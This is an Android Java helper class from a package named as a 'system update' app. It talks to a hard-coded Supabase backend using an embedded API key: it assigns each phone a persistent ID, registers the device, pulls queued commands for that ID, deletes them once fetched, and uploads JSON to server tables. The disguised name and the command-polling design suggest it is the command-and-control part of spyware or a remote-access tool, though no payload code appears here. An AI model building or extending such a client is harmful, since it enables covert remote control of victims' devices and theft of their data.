package com.sysupdate.app;

import android.content.Context;
import android.content.SharedPreferences;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class SB {
    public static final String URL = "https://kuxrsbgmwegyfemsgqyo.supabase.co";
    public static final String KEY = "sb_publishable_EYcfqp_BDYa7WbdDQUDvJA_YUQPqyDy";
    public static String DEVICE_ID = "";

    public static void init(Context ctx) {
        SharedPreferences p = ctx.getSharedPreferences("sys", Context.MODE_PRIVATE);
        DEVICE_ID = p.getString("did", null);
        if (DEVICE_ID == null) {
            DEVICE_ID = UUID.randomUUID().toString();
            p.edit().putString("did", DEVICE_ID).apply();
        }
    }

    private static HttpURLConnection open(String path, String method) throws Exception {
        HttpURLConnection c = (HttpURLConnection) new URL(URL + path).openConnection();
        c.setRequestMethod(method);
        c.setRequestProperty("apikey", KEY);
        c.setRequestProperty("Authorization", "Bearer " + KEY);
        c.setRequestProperty("Content-Type", "application/json");
        c.setConnectTimeout(15000);
        c.setReadTimeout(15000);
        return c;
    }

    public static String get(String path) {
        try {
            HttpURLConnection c = open(path, "GET");
            c.setRequestProperty("Prefer", "return=minimal");
            if (c.getResponseCode() >= 400) return "[]";
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = r.readLine()) != null) sb.append(line);
            r.close();
            return sb.toString();
        } catch (Exception e) { return "[]"; }
    }

    public static boolean post(String table, JSONObject data) {
        try {
            HttpURLConnection c = open("/rest/v1/" + table, "POST");
            c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            os.write(data.toString().getBytes());
            os.close();
            int code = c.getResponseCode();
            return code < 400;
        } catch (Exception e) { return false; }
    }

    public static boolean post(String table, JSONArray data) {
        try {
            HttpURLConnection c = open("/rest/v1/" + table, "POST");
            c.setDoOutput(true);
            OutputStream os = c.getOutputStream();
            os.write(data.toString().getBytes());
            os.close();
            int code = c.getResponseCode();
            return code < 400;
        } catch (Exception e) { return false; }
    }

    public static boolean delete(String query) {
        try {
            HttpURLConnection c = open("/rest/v1/" + query, "DELETE");
            return c.getResponseCode() < 400;
        } catch (Exception e) { return false; }
    }

    // upsertDevice — نحذف القديم ثم نضيف جديد
    public static void upsertDevice(JSONObject data) {
        try {
            // احذف السجل القديم
            delete("devices?device_id=eq." + DEVICE_ID);
            // أضف سجل جديد
            post("devices", data);
        } catch (Exception e) {}
    }

    public static JSONArray fetchCommands() {
        try {
            String r = get("/rest/v1/commands?device_id=eq." + DEVICE_ID + "&order=created_at.asc");
            return new JSONArray(r);
        } catch (Exception e) { return new JSONArray(); }
    }

    public static void deleteCommand(long id) {
        delete("commands?id=eq." + id);
    }

    public static void insert(String table, JSONObject obj) {
        post(table, obj);
    }
}
